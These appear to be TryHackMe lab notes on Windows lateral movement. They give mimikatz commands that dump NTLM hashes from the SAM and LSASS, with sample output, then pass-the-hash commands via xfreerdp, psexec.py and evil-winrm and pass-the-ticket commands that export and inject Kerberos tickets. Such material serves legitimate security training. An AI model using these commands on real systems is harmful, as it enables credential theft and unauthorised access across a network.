# NTLM Authentication

If we aren't lucky enough, we will end up with non-cracked NTLM password hashes. Although it may seem we can't really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully. To extract NTLM hashes, we can either use **mimikatz** to read the local SAM or extract hashes directly from LSASS memory.

## Extracting NTLM hashes from local SAM:

<code>`mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
Hash NTLM: 145e02c50333951f71d13c245d352b50</code>

## Extracting NTLM hashes from LSASS memory:

<code>mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484</code>

## Passing the Hash Using Linux:

If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the following:

1. Connect to RDP using PtH:
`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`

2. Connect via psexec using PtH:
`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`
Note: Only the linux version of psexec support PtH.

3. Connect to WinRM using PtH:
`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

# Kerberos Authentication

## Pass the ticket

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. **The process usually requires us to have SYSTEM privileges** on the attacked machine and can be done as follows:

<code>mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export</code>

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

`mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`